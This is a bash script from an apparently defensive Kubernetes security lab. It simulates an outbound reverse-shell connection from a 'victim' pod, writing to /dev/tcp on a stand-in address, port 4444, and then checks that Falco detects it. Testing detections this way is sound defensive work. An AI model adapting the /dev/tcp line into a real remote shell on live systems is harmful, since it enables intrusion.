#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
POD=$(kubectl get pod -n security-lab -l app=victim -o jsonpath='{.items[0].metadata.name}')

echo ">>> Simulate reverse shell outbound from ${POD}..."
kubectl exec -n security-lab "$POD" -- sh -c 'sh -c "echo test >/dev/tcp/10.255.255.1/4444"' 2>/dev/null || true

echo ">>> Waiting for Falco..."
sleep 8
"${ROOT}/scripts/capture-scenario-evidence.sh" 3m 'K8sSoar Reverse Shell Outbound|Reverse shell|scenario-04'
